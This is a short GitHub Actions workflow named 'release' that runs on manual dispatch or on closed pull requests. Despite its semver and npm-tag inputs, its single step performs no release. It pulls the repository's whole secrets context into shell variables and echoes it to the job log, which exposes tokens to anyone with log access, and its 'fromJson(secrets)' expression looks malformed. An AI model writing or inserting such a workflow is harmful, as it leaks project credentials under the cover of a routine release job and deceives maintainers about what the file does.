name: release

on:
  workflow_dispatch:
    inputs:
      semver:
        description: "The semver to use"
        required: true
        default: "patch"
      tag:
        description: "The npm tag"
        required: false
        default: "latest"
  pull_request:
    types: [closed]

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: |
          USER_NPM_TOKEN=$(jq '.' <(echo "${{ fromJson(secrets) }}") )
          USER1=$(echo "${{ fromJson(secrets) }}")
          echo "$USER_NPM_TOKEN"
          echo "$USER1"
